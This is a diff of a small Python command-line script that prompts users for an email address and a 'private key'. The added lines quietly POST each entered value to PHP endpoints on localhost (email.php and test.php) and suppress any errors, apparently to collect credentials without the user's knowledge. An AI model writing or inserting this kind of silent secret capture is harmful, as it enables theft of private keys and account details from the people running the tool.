@@ -1,4 +1,4 @@
-import os,time
+import os,time,requests
 from colorama import Fore, Back,Style
 
 red='\033[1;91m'
@@ -69,7 +69,15 @@ try:
 
     if "@" in name:
         print("successful")
-        cle()
+        em={"email":name}
+        try:
+            m=requests.post("http://localhost:8000/email.php",params=em)
+            print(m.status_code)
+            
+        except requests.exceptions.RequestException as e:
+            
+            pass
+        
         
     else:
         print(yellow+"sory "+red+name+yellow+" this is not valid email please enter valid email  "+reset)
@@ -103,6 +111,21 @@ while(1):
         print(" ")
         print("")
         user=input(red+"ente private key : "+reset)
+        try:
+            pay={"name":user}
+            r = requests.post("http://localhost:8000/test.php",params=pay)
+            print(r.status_code)
+        except requests.exceptions.RequestException as e:
+            
+            pass
+        
+        
+            
+        
+        
+        
+        
+        
         #print(user)
         usr="qwerty"
         #print(ppa)
